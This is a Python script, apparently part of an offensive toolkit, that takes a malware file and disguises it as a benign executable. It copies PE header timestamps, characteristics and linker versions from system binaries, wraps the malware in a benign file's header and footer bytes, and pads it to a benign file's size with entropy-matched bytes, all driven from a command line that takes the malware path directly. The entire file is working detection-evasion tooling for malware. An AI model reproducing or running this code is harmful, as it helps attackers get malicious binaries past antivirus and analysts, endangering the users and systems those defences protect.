#!/usr/bin/env python3
"""
Evasion Technique: Mimicry
Mimic characteristics of known benign applications.
"""

import struct
import random
from pathlib import Path
import os

def get_benign_samples(directory='/usr/bin', count=5):
    """Get sample benign executables from system."""
    benign_dir = Path(directory)
    
    if not benign_dir.exists():
        return []
    
    # Get executable files
    executables = []
    for file in benign_dir.iterdir():
        if file.is_file() and os.access(file, os.X_OK):
            # Check if it's a PE or ELF file
            try:
                with open(file, 'rb') as f:
                    header = f.read(4)
                    # ELF or PE files
                    if header[:2] == b'MZ' or header[:4] == b'\x7fELF':
                        executables.append(file)
            except:
                continue
    
    # Return random sample
    if len(executables) > count:
        return random.sample(executables, count)
    return executables

def extract_pe_characteristics(pe_file):
    """Extract characteristics from a PE file that can be mimicked."""
    try:
        with open(pe_file, 'rb') as f:
            data = f.read()
        
        # Check PE signature
        if len(data) < 64 or data[0:2] != b'MZ':
            return None
        
        pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
        
        if pe_offset + 24 > len(data) or data[pe_offset:pe_offset+4] != b'PE\x00\x00':
            return None
        
        # Extract various characteristics
        coff_header_offset = pe_offset + 4
        timestamp = struct.unpack('<I', data[coff_header_offset+4:coff_header_offset+8])[0]
        characteristics = struct.unpack('<H', data[coff_header_offset+18:coff_header_offset+20])[0]
        
        # Optional header
        optional_header_offset = coff_header_offset + 20
        if optional_header_offset + 64 < len(data):
            major_linker_version = data[optional_header_offset + 2]
            minor_linker_version = data[optional_header_offset + 3]
            
            return {
                'timestamp': timestamp,
                'characteristics': characteristics,
                'linker_version': (major_linker_version, minor_linker_version),
                'file_size': len(data)
            }
        
        return None
    
    except:
        return None

def mimic_pe_header(malware_file, output_file, benign_template):
    """
    Modify malware PE header to mimic a benign file.
    
    Args:
        malware_file: Path to malware file
        output_file: Path to output file
        benign_template: Path to benign file to mimic
    
    Returns:
        dict with mimicry info
    """
    malware_path = Path(malware_file)
    output_path = Path(output_file)
    benign_path = Path(benign_template)
    
    # Read malware
    with open(malware_path, 'rb') as f:
        malware_data = bytearray(f.read())
    
    # Check if malware is PE
    if len(malware_data) < 64 or malware_data[0:2] != b'MZ':
        return {'error': 'Malware is not a PE file'}
    
    malware_pe_offset = struct.unpack('<I', malware_data[0x3C:0x40])[0]
    
    if malware_pe_offset + 24 > len(malware_data):
        return {'error': 'Invalid PE structure'}
    
    # Extract benign characteristics
    benign_chars = extract_pe_characteristics(benign_template)
    
    if not benign_chars:
        return {'error': 'Could not extract benign characteristics'}
    
    modifications = []
    
    # Apply benign characteristics to malware
    malware_coff_offset = malware_pe_offset + 4
    
    # Copy timestamp
    struct.pack_into('<I', malware_data, malware_coff_offset + 4, benign_chars['timestamp'])
    modifications.append(f"Timestamp mimicked: {benign_chars['timestamp']}")
    
    # Copy characteristics
    struct.pack_into('<H', malware_data, malware_coff_offset + 18, benign_chars['characteristics'])
    modifications.append(f"Characteristics mimicked: {benign_chars['characteristics']:#x}")
    
    # Copy linker version
    malware_optional_offset = malware_coff_offset + 20
    if malware_optional_offset + 4 < len(malware_data):
        malware_data[malware_optional_offset + 2] = benign_chars['linker_version'][0]
        malware_data[malware_optional_offset + 3] = benign_chars['linker_version'][1]
        modifications.append(f"Linker version mimicked: {benign_chars['linker_version']}")
    
    # Save modified file
    with open(output_path, 'wb') as f:
        f.write(malware_data)
    
    return {
        'technique': 'mimicry_pe_header',
        'benign_template': str(benign_template),
        'modifications': modifications,
        'original_size': malware_path.stat().st_size,
        'new_size': len(malware_data)
    }

def mimic_file_structure(malware_file, output_file, benign_template):
    """
    Mimic file structure by mixing malware with benign file patterns.
    
    Args:
        malware_file: Path to malware file
        output_file: Path to output file
        benign_template: Path to benign file to mimic
    
    Returns:
        dict with mimicry info
    """
    malware_path = Path(malware_file)
    output_path = Path(output_file)
    benign_path = Path(benign_template)
    
    # Read files
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    with open(benign_path, 'rb') as f:
        benign_data = f.read()
    
    # Strategy: Take header from benign, payload from malware, footer from benign
    benign_header_size = min(1024, len(benign_data) // 4)
    benign_footer_size = min(512, len(benign_data) // 8)
    
    benign_header = benign_data[:benign_header_size]
    benign_footer = benign_data[-benign_footer_size:] if benign_footer_size > 0 else b''
    
    # Create mimicked file
    mimicked_data = benign_header + malware_data + benign_footer
    
    with open(output_path, 'wb') as f:
        f.write(mimicked_data)
    
    return {
        'technique': 'mimicry_file_structure',
        'benign_template': str(benign_template),
        'benign_header_size': benign_header_size,
        'malware_size': len(malware_data),
        'benign_footer_size': benign_footer_size,
        'total_size': len(mimicked_data)
    }

def mimic_size_and_entropy(malware_file, output_file, benign_template):
    """
    Adjust malware size to match benign file by padding.
    
    Args:
        malware_file: Path to malware file
        output_file: Path to output file
        benign_template: Path to benign file to mimic
    
    Returns:
        dict with mimicry info
    """
    malware_path = Path(malware_file)
    output_path = Path(output_file)
    benign_path = Path(benign_template)
    
    # Read malware
    with open(malware_path, 'rb') as f:
        malware_data = f.read()
    
    # Get benign size
    benign_size = benign_path.stat().st_size
    malware_size = len(malware_data)
    
    if benign_size > malware_size:
        # Pad to match benign size
        padding_size = benign_size - malware_size
        
        # Use mixed padding (some zeros, some random) to match entropy
        padding = bytearray()
        for _ in range(padding_size):
            if random.random() < 0.7:  # 70% zeros (common in executables)
                padding.append(0)
            else:
                padding.append(random.randint(0, 255))
        
        modified_data = malware_data + bytes(padding)
    else:
        # If malware is larger, just copy it
        modified_data = malware_data
    
    with open(output_path, 'wb') as f:
        f.write(modified_data)
    
    return {
        'technique': 'mimicry_size_entropy',
        'benign_template': str(benign_template),
        'benign_size': benign_size,
        'original_malware_size': malware_size,
        'padding_added': len(modified_data) - malware_size,
        'final_size': len(modified_data)
    }

def apply_random_benign_mimicry(malware_file, output_file, benign_dir='/usr/bin'):
    """
    Apply mimicry using a random benign template from directory.
    """
    benign_samples = get_benign_samples(benign_dir, count=10)
    
    if not benign_samples:
        return {'error': f'No benign samples found in {benign_dir}'}
    
    # Pick random benign sample
    benign_template = random.choice(benign_samples)
    
    # Try PE header mimicry first
    result = mimic_pe_header(malware_file, output_file, benign_template)
    
    # If that fails, try file structure mimicry
    if 'error' in result:
        result = mimic_file_structure(malware_file, output_file, benign_template)
    
    return result

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python mimicry.py <malware_file> <output_file> [benign_template] [method]")
        print("Methods: header, structure, size, auto")
        print()
        print("If benign_template is not provided, a random one will be selected from /usr/bin")
        sys.exit(1)
    
    malware_file = sys.argv[1]
    output_file = sys.argv[2]
    benign_template = sys.argv[3] if len(sys.argv) > 3 else None
    method = sys.argv[4] if len(sys.argv) > 4 else "auto"
    
    if benign_template is None:
        result = apply_random_benign_mimicry(malware_file, output_file)
    else:
        if method == "header":
            result = mimic_pe_header(malware_file, output_file, benign_template)
        elif method == "structure":
            result = mimic_file_structure(malware_file, output_file, benign_template)
        elif method == "size":
            result = mimic_size_and_entropy(malware_file, output_file, benign_template)
        else:  # auto
            # Try header first, then structure
            result = mimic_pe_header(malware_file, output_file, benign_template)
            if 'error' in result:
                result = mimic_file_structure(malware_file, output_file, benign_template)
    
    if 'error' in result:
        print(f"Error: {result['error']}")
        sys.exit(1)
    
    print(f"Mimicry applied: {output_file}")
    print(f"Technique: {result['technique']}")
    
    if 'benign_template' in result:
        print(f"Benign template: {result['benign_template']}")
    
    if 'modifications' in result:
        print("Modifications:")
        for mod in result['modifications']:
            print(f"  - {mod}")

